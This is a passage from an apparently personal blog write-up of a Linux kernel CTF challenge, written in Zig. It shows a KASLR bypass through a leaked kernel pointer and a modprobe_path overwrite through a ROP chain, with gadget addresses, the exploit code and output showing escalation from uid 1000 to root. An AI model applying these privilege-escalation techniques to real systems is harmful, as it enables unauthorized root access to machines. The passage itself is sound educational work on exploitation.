</span></span><span><span>&gt; 00007ffcef217602  00 DC CA 46 F0 90 FF FF  F0 7E 1C C0 28 A9 FF FF  ...F.....~..(...
</span></span><span><span>&gt; 00007ffcef217612  00 DC CA 46 F0 90 FF FF  80 7E 1C C0 28 A9 FF FF  ...F.....~..(...
</span></span><span><span>&gt; 00007ffcef217622  97 45 2E B3 FF FF FF FF  97 45 2E B3 FF FF FF FF  .E.......E......
</span></span><span><span>&gt; 00007ffcef217632  00 DC CA 46 F0 90 FF FF  00 00 00 00 00 00 00 00  ...F............
</span></span><span><span>&gt; 00007ffcef217642  D2 75 21 EF FC 7F 00 00  A0 7E 1C C0 28 A9 FF FF  .u!......~..(...
</span></span><span><span>&gt; 00007ffcef217652  00 0E 76 FC EA 35 42 B0  5E 01 00 00 00 00 00 00  ..v..5B.^.......
</span></span><span><span>&gt; 00007ffcef217662  00 00 00 00 00 00 00 00  D8 7E 1C C0 28 A9 FF FF  .........~..(...
</span></span><span><span>&gt; 00007ffcef217672  AF E5 28 B3 FF FF FF FF  00 DC CA 46 F0 90 FF FF  ..(........F....
</span></span><span><span>&gt; 00007ffcef217682  00 DC CA 46 F0 90 FF FF  D2 75 21 EF FC 7F 00 00  ...F.....u!.....
</span></span><span><span>&gt; 00007ffcef217692  5E 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ^...............
</span></span><span><span>&gt; 00007ffcef2176a2  20 7F 1C C0 28 A9 FF FF  C7 2E 70 B3 FF FF FF FF   ...(.....p.....
</span></span><span><span>&gt; 00007ffcef2176b2  B1 59 70 B3 FF FF FF FF  00 00 00 00 00 00 00 00  .Yp.............
</span></span><span><span>&gt; 00007ffcef2176c2  00 0E 76 FC EA 35 42 B0  58 7F 1C C0 28 A9 FF FF  ..v..5B.X...(...
</span></span><span><span>&gt; 00007ffcef2176d2  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
</span></span><span><span>&gt; 00007ffcef2176e2  00 00 00 00 00 00 00 00  30 7F 1C C0 28 A9 FF FF  ........0...(...
</span></span><span><span>&gt; 00007ffcef2176f2  3A 14 4C B3 FF FF FF FF  48 7F 1C C0 28 A9 FF FF  :.L.....H...(...
</span></span><span><span>&gt; 00007ffcef217702  57 A1 C0 B2 FF FF FF FF  00 00 00 00 00 00 00 00  W...............
</span></span><span><span>&gt; 00007ffcef217712  00 00 00 00 00 00 00 00  8C 00 E0 B2 FF FF FF FF  ................
</span></span><span><span>&gt; 00007ffcef217722  00 00 00 00 00 00 00 00  00 00 00 00 00 00        ..............
</span></span></code></pre></div><p>Notice the values <code>buf[304..304+8]</code> and <code>buf[328..328+8]</code>: across the different runs only the 4th least significant byte differs.
Furthermore, this byte is the same for both values in a single run, so it’s very likely that these values are a constant offset from the kernel base.
As it turns out, masking out the lower 2 bytes of <code>buf[304..304+8]</code> yields the kernel base address (source: trust me bro)!</p>




<div><pre tabindex="0"><code data-lang="zig"><span><span><span>fn</span> leakBaseAddress(fd<span>:</span> std.posix.fd_t) <span>!</span><span>u64</span> {
</span></span><span><span>    <span>var</span> buf<span>:</span> [<span>304</span><span>+</span><span>8</span>]<span>u8</span> <span>=</span> <span>undefined</span>;
</span></span><span><span>    _ <span>=</span> <span>try</span> std.posix.read(fd, <span>&amp;</span>buf);
</span></span><span><span>    <span>const</span> ret <span>=</span> std.mem.bytesAsValue(<span>u64</span>, buf[<span>304</span>..]).<span>*</span>;
</span></span><span><span>    <span>return</span> (ret <span>&gt;&gt;</span> <span>16</span>) <span>&lt;&lt;</span> <span>16</span>;
</span></span><span><span>}</span></span></code></pre></div><p>We just need to call <code>adjust_offsets</code> with our kernel base address leak, and bob’s our uncle.</p>



<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x6071ec017b6ac500
</span></span><span><span>[INFO] Kernel base: 0xffffffffa4200000
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h4 id="alternate-solve-modprobe-path">Alternate solve: <code>modprobe_path</code></h4>
<p>This is not an alternative bypass to KASLR, but rather a different attack vector to indirectly achieve priviledge escalation without putzing with <code>commit_creds(prepare_kernel_cred(0))</code>.</p>
<p>Basically, when <code>execve</code>‘ing a binary with magic bytes the kernel doesn’t recognize, eventually the following will get called:</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span><span>$modprobe_path</span> -q -- binfmt-<span>$MAGIC</span></span></span></code></pre></div><p>Where <code>$modprobe_path</code> is the string stored in the <code>modprobe_path</code> kernel symbol, and <code>$MAGIC</code> is whatever the magic bytes of the file are.
So if we overwrite <code>modprobe_path</code>, we can get the kernel to execute a file we control.</p>



<div><pre tabindex="0"><code data-lang="bash"><span><span>cat /proc/kallsyms | grep -e <span>&#39;modprobe_path&#39;</span></span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>ffffffff82061820 D modprobe_path</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span>ropr --range<span>=</span>0xffffffff81000000-0xffffffff81400dc6 -R <span>&#39;^(pop rdi;|pop rax;|mov \[rdi+.{3,5}\], ...;) ret;&#39;</span> vmlinux</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>0xffffffff81004d11: pop rax; ret;
</span></span><span><span>0xffffffff8100767c: pop rdi; ret;
</span></span><span><span>0xffffffff81012833: mov [rdi+0x10], r8d; ret;
</span></span><span><span>0xffffffff81012834: mov [rdi+0x10], eax; ret;</span></span></code></pre></div>



<div><pre tabindex="0"><code data-lang="zig"><span><span><span>var</span> POP_RDI<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff8100767c</span>;
</span></span><span><span><span>var</span> POP_RAX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81004d11</span>;
</span></span><span><span><span>var</span> MOV_ADDROF_RDI_PLUS_16_EAX<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81012834</span>;
</span></span><span><span>
</span></span><span><span><span>var</span> MODPROBE_PATH<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff82061820</span>;
</span></span><span><span><span>var</span> KPTI_TRAMPOLINE<span>:</span> <span>u64</span> <span>=</span> <span>0xffffffff81200f26</span>;
</span></span><span><span>
</span></span><span><span><span>fn</span> ropchain(writer<span>:</span> anytype) <span>!</span><span>void</span> {
</span></span><span><span>    <span>try</span> writer.writeAll(std.mem.asBytes(<span>&amp;</span>[_]<span>u64</span>{
</span></span><span><span>        POP_RAX,
</span></span><span><span>        std.mem.readInt(<span>u32</span>, <span>&#34;/tmp&#34;</span>, .little),
</span></span><span><span>        POP_RDI,
</span></span><span><span>        MODPROBE_PATH<span>-</span><span>0x10</span>,
</span></span><span><span>        MOV_ADDROF_RDI_PLUS_16_EAX,
</span></span><span><span>        POP_RAX,
</span></span><span><span>        std.mem.readInt(<span>u32</span>, <span>&#34;/a&#34;</span> <span>++</span> <span>&amp;</span>[_]<span>u8</span>{<span>0</span>} <span>**</span> <span>2</span>, .little),
</span></span><span><span>        POP_RDI,
</span></span><span><span>        MODPROBE_PATH<span>-</span><span>0x10</span><span>+</span><span>0x4</span>,
</span></span><span><span>        MOV_ADDROF_RDI_PLUS_16_EAX,
</span></span><span><span>
</span></span><span><span>        KPTI_TRAMPOLINE,
</span></span><span><span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>0</span>, <span>// junk
</span></span></span><span><span><span></span>        <span>@intFromPtr</span>(<span>&amp;</span>ret2win),
</span></span><span><span>        user_cs,
</span></span><span><span>        user_rflags,
</span></span><span><span>        user_rsp,
</span></span><span><span>        user_ss,
</span></span><span><span>    }));
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>fn</span> ret2win() <span>!</span><span>void</span> {
</span></span><span><span>    std.debug.print(<span>&#34;[INFO] You won!!</span><span>\n</span><span>&#34;</span>, .{});
</span></span><span><span>
</span></span><span><span>    <span>const</span> tmpa <span>=</span> <span>try</span> std.fs.cwd().createFile(
</span></span><span><span>        <span>&#34;/tmp/a&#34;</span>, .{
</span></span><span><span>            .read <span>=</span> <span>true</span>,
</span></span><span><span>            .mode <span>=</span> <span>0o777</span>,
</span></span><span><span>        },
</span></span><span><span>    );
</span></span><span><span>    <span>try</span> tmpa.writeAll(
</span></span><span><span>        <span>\\#!/bin/sh</span>
</span></span><span><span>        <span>\\whoami &amp;&gt; /tmp/its-a-me</span>
</span></span><span><span>        <span>\\chmod 777 /tmp/its-a-me</span>
</span></span><span><span>    );
</span></span><span><span>    tmpa.close();
</span></span><span><span>
</span></span><span><span>    <span>const</span> unknown <span>=</span> <span>try</span> std.fs.cwd().createFile(
</span></span><span><span>        <span>&#34;/tmp/unknown&#34;</span>, .{
</span></span><span><span>            .read <span>=</span> <span>true</span>,
</span></span><span><span>            .mode <span>=</span> <span>0o777</span>,
</span></span><span><span>        },
</span></span><span><span>    );
</span></span><span><span>    <span>try</span> unknown.writeAll(<span>&amp;</span>[_]<span>u8</span>{<span>0xff</span>}<span>**</span><span>4</span>);
</span></span><span><span>    unknown.close();
</span></span><span><span>}</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="bash"><span><span>whoami
</span></span><span><span>./exploit
</span></span><span><span><span># execute bogus file</span>
</span></span><span><span>/tmp/unknown &amp;&gt; /dev/null
</span></span><span><span>cat /tmp/its-a-me</span></span></code></pre></div>


<div><pre tabindex="0"><code data-lang="text"><span><span>whoami: unknown uid 1000
</span></span><span><span>[INFO] Saved state
</span></span><span><span>[INFO] Canary: 0x0743fe8b3c798800
</span></span><span><span>[INFO] Kernel base: 0xffffffff85800000
</span></span><span><span>[INFO] You won!!
</span></span><span><span>whoami: unknown uid 0</span></span></code></pre></div><h2 id="resources">Resources</h2>
<p>This was my first time solving a kernel pwn challenge, and I was initially quite lost as how to even approach this challenge.
I found the following resources invaluable:</p>
<dl>
<dt><a href="https://pawnyable.cafe/linux-kernel/LK01/stack_overflow.html">PAWNYABLE Holstein v1</a></dt>
<dd>Really good resource for learning the basics of kernel pwn and setting up your environment for kernel debugging.</dd>
<dt>Other kernel-rop writeups</dt>
<dd>The writeups published by <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">Midas</a> and <a href="https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/">0x434b</a> were super helpful for learning bypasses to different mitigations and alternative solutions to arrive at privileged code execution.</dd>
</dl>
<p>For those curious, I wrote <a href="https://www.science.org/kernel-rop/SOLVE.org">the exploits and this post</a> using Emacs org-mode.
Taking the time to get it setup was a little annoying, but being able to run arbitrary commands in the challenge VM (not to mention compiling an exploit and regenerating the initramfs) with a single keystroke hugely improved my productivity.</p>
<p>Using Zig instead of C was also quite nice because of a (imo) much better standard library and quick compile times.
Even if using C, using <code>zig cc</code> to easily target <code>x86_64-linux-musl</code> is super convenient.</p>
<div><p><i>If you want to program at the edge of your abilities, consider applying to the <i></i> <a href="https://www.recurse.com/scout/click?t=c9ef0a055fcd2cd243ac045bc1f6dd82">Recurse Center</a>.</i></p> </div>
<div role="doc-endnotes">
<hr/>
<ol>
<li id="fn:1">
<p><a href="https://ir0nstone.gitbook.io/notes/binexp/kernel/the-ultimate-aim-of-kernel-exploitation-process-credentials">https://ir0nstone.gitbook.io/notes/binexp/kernel/the-ultimate-aim-of-kernel-exploitation-process-credentials</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2">
<p><a href="https://tldp.org/HOWTO/Module-HOWTO/x627.html">https://tldp.org/HOWTO/Module-HOWTO/x627.html</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3">
<p><a href="https://elixir.bootlin.com/linux/v5.9-rc6/source/include/linux/export.h#L60-L64">https://elixir.bootlin.com/linux/v5.9-rc6/source/include/linux/export.h#L60-L64</a> <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</div>

</div></div>
  </body>
</html>
